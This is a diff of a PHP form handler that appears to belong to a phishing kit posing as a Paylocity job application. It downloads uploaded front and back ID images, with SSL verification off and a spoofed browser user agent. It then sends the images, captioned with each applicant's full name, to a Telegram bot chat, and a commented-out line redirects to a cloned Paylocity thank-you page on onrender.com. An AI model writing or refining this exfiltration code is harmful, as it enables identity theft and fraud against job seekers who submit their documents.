@@ -197,20 +197,42 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
 
-    
-    // Function to download Jotform-hosted files
-    function downloadJotformFile($file_url, $save_path) {
-        $ch = curl_init($file_url);
-        $fp = fopen($save_path, 'wb');
 
-        curl_setopt($ch, CURLOPT_FILE, $fp);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
+    // Function to download Jotform-hosted files
+    // function downloadJotformFile($file_url, $save_path) {
+    //     $ch = curl_init($file_url);
+    //     $fp = fopen($save_path, 'wb');
+
+    //     curl_setopt($ch, CURLOPT_FILE, $fp);
+    //     curl_setopt($ch, CURLOPT_HEADER, 0);
+    //     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    //     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+    //     curl_exec($ch);
+    //     curl_close($ch);
+    //     fclose($fp);
+    // }
+
+
+    function downloadJotformFile($file_url, $save_path) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $file_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-
-        curl_exec($ch);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0"); // Mimic a browser
+    
+        $file_data = curl_exec($ch);
+        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
-        fclose($fp);
+    
+        // Verify download success
+        if ($http_status == 200 && $file_data) {
+            file_put_contents($save_path, $file_data);
+            return true;
+        } else {
+            return false; // File download failed
+        }
     }
 
     // Download and save files
@@ -272,31 +294,93 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
     // Send files to Telegram
-    $files_to_send = [
-        'Front ID' => $front_id_path,
-        'Back ID' => $back_id_path
-    ];
+    // $files_to_send = [
+    //     'Front ID' => $front_id_path,
+    //     'Back ID' => $back_id_path
+    // ];
 
-    foreach ($files_to_send as $label => $file) {
-        if ($file) {
-            $telegram_file_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendDocument";
+    // foreach ($files_to_send as $label => $file) {
+    //     if ($file) {
+    //         $telegram_file_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendDocument";
             
-            $file_data = [
+    //         $file_data = [
+    //             'chat_id' => TELEGRAM_CHAT_ID,
+    //             'document' => new CURLFile(realpath($file)),
+    //             'caption' => "📎 *$label* uploaded by *$full_name* at $timestamp",
+    //             'parse_mode' => 'Markdown'
+    //         ];
+
+    //         $ch = curl_init();
+    //         curl_setopt($ch, CURLOPT_URL, $telegram_file_url);
+    //         curl_setopt($ch, CURLOPT_POST, 1);
+    //         curl_setopt($ch, CURLOPT_POSTFIELDS, $file_data);
+    //         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    //         curl_exec($ch);
+    //         curl_close($ch);
+    //     }
+    // }
+
+
+
+
+
+
+
+
+
+    function sendFileToTelegram($file_path, $caption) {
+        if (!file_exists($file_path) || filesize($file_path) == 0) {
+            echo "Skipping $caption - File is missing or empty.<br>";
+            return; // Prevent sending empty or non-existing files
+        }
+    
+        $telegram_url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/";
+        
+        // Get file extension
+        $file_extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
+        $image_extensions = ['jpg', 'jpeg', 'png', 'gif'];
+    
+        // If file is an image, send as a photo
+        if (in_array($file_extension, $image_extensions)) {
+            $telegram_url .= "sendPhoto";
+            $post_data = [
                 'chat_id' => TELEGRAM_CHAT_ID,
-                'document' => new CURLFile(realpath($file)),
-                'caption' => "📎 *$label* uploaded by *$full_name* at $timestamp",
+                'photo' => new CURLFile(realpath($file_path)), 
+                'caption' => $caption,
                 'parse_mode' => 'Markdown'
             ];
-
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, $telegram_file_url);
-            curl_setopt($ch, CURLOPT_POST, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $file_data);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-            curl_exec($ch);
-            curl_close($ch);
+        } else {
+            // Send all other file types as documents
+            $telegram_url .= "sendDocument";
+            $post_data = [
+                'chat_id' => TELEGRAM_CHAT_ID,
+                'document' => new CURLFile(realpath($file_path)), 
+                'caption' => $caption,
+                'parse_mode' => 'Markdown'
+            ];
         }
+    
+        // Send request to Telegram
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $telegram_url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $response = curl_exec($ch);
+        curl_close($ch);
+    
+        echo "Sent to Telegram: $caption <br>";
     }
+
+    // Send Front ID
+    sendFileToTelegram($front_id_path, "📎 *Front ID* uploaded by *$full_name*");
+
+    // Send Back ID
+    sendFileToTelegram($back_id_path, "📎 *Back ID* uploaded by *$full_name*");
+
+
+
+
 
     // header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
 // exit;
